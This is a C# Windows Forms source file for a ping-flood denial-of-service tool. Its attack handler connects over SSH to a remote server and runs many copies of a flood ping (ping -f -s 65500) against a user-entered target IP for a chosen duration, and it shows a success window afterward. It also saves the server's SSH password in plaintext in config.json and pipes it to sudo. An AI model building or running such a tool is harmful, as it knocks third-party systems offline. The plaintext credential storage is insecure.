using Newtonsoft.Json;
using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OFFINERY
{
    public partial class mainForm : Form
    {
        public bool isHitting = false;
        Ping pingSender = new Ping();
        public mainForm()
        {
            InitializeComponent();
            InitTimer();
            if (File.Exists("config.json"))
            {
                string text = System.IO.File.ReadAllText("config.json");
                serverinfo s = JsonConvert.DeserializeObject<serverinfo>(text);
                serveripBox.Text = s.IP;
                usernameBox.Text = s.User;
                passwordBox.Text = s.Pass;
            }
        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private Timer timer1;
        public void InitTimer()
        {
            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 1000;
            timer1.Start();
        }

        int curTime = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (isHitting)
            {
                curTime += 1;
                if (curTime >= durationBox.Value)
                {
                    attackButton.Enabled = true;
                    isHitting = false;
                    Success f2 = new Success();
                    f2.Show();
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            attackButton.Enabled = false;
            isHitting = true;
            string command = "";
            for (int i = 0; i < powerBox.Value; i++)
            {
                command += string.Format("echo {0} | sudo -S timeout {1} ping -f -s 65500 -l 3 {2} &", passwordBox.Text, durationBox.Value, targetipBox.Text);
            }
            using (var client = new SshClient(serveripBox.Text, usernameBox.Text, passwordBox.Text))
            {
                client.Connect();
                client.RunCommand(command);
                client.Disconnect();
            }
        }

        private void durationBox_ValueChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            serverinfo info = new serverinfo();
            info.IP = serveripBox.Text;
            info.User = usernameBox.Text;
            info.Pass = passwordBox.Text;

            string json = JsonConvert.SerializeObject(info);

            System.IO.File.WriteAllText("config.json", json);
        }

        public class serverinfo
        {
            public string IP;
            public string User;
            public string Pass;
        }

        private void groupBox5_Enter(object sender, EventArgs e)
        {

        }
    }
}
